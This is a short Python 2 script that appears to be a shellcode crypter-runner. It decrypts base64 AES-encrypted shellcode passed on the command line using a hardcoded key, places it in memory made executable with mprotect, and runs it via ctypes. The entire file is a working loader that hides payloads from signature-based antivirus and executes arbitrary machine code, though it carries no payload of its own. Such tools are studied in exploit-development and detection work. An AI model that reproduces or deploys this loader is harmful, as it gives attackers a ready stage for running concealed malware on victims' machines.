#!/usr/bin/env python

from Crypto.Cipher import AES
from ctypes import *
import sys
import os
import base64

if len(sys.argv) != 2:
	print '[!] Usage: ' + sys.argv[0] + ' <shellcode>'
	sys.exit(1)

Shellcode = sys.argv[1]

# decrypt shellcode
Seperation ='{'
decode = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(Seperation)
Key = '_@ihack4falafel_'
print 'Encryption Key     : ' + Key
Cipher = AES.new(Key)
decoded = decode (Cipher, Shellcode)
print 'Decrypted Shellcode: ' + decoded

# execute decrypted shellcode using ctypes
libc = CDLL('libc.so.6')
RawShellcode = decoded.replace('\\x','').decode('hex')
sc = c_char_p(RawShellcode)
size = len(RawShellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
